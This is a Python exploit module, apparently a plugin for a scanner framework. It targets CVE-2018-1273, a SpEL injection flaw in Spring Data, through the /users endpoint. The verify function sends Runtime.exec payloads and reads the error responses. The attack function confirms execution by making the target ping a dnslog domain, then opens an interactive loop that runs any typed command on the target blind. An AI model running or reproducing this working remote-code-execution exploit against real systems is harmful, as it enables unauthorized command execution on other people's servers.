import requests, urllib
import re
import inc.dnslog

def verify(url):
    relsult = {
        'name': 'spring 代码执行(CVE-2018-1273)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        "Content-type": "application/x-www-form-urlencoded"
    }
    try:
        rep = requests.get(url, timeout=3)
        if re.search('timestamp', rep.text) and re.search('status', rep.text) and rep.status_code == 404:
            vurl = urllib.parse.urljoin(url, '/users')

            payload = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]'''
            payload2 = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("aaaaaa")]'''
            rep1 = requests.post(vurl, headers=headers, data=payload, timeout=3)
            rep2 = requests.post(vurl, headers=headers, data=payload2, timeout=3)
            if rep1.status_code == rep2.status_code == 500 and re.search('Invalid property', rep1.text) and re.search('A problem occurred', rep2.text):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['about'] = 'https://www.cnblogs.com/cute-puli/p/15338017.html'
        return relsult
    except:
        return relsult


def attack(url):
    try:
        dnslog = inc.dnslog.Dnslog()
        dnslog_domain = dnslog.dnslog_getdomain()
        if dnslog_domain:
            print('[+] 获取到dnslog域名 {0}'.format(dnslog_domain))
            headers = {
                "Content-type": "application/x-www-form-urlencoded"
            }
            vurl = urllib.parse.urljoin(url, '/users')
            cmd = 'ping {0}'.format(dnslog_domain)
            payload = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("%s")]'''
            try:
                rep = requests.post(vurl, headers=headers, data=payload % cmd, timeout=5)
            except:
                pass
            print('[+] 尝试执行命令: {0}'.format(cmd))
            print('[+] 等待检测回显 .........')
            dnslog.dnslog_sleep()
            dnslog_rep = dnslog.dnslog_getrep()
            if re.search(dnslog_domain, dnslog_rep):
                print('[+] 检测到回显，目标存在漏洞-CVE-2018-1273!')
                print('[*] 开始执行无回显命令,输入exit退出!')
                while cmd != 'exit':
                    cmd = input('[+] 执行命令(无回显)>')
                    rep = requests.post(vurl, headers=headers, data=payload % cmd, timeout=5)
                    print('[+] 命令执行成功请手动用dnslog或vps检查!')
            else:
                print('[-] 未检测到回显，目标可能不出网或等待时间过短')
            return True
        else:
            print('[-] 该exp将调用dnslog进行检测,请追加 --dnslog 参数!')
        return False
    except:
        return False

if __name__ == '__main__':
    print(verify('http://vulfocus.fofa.so:55508/'))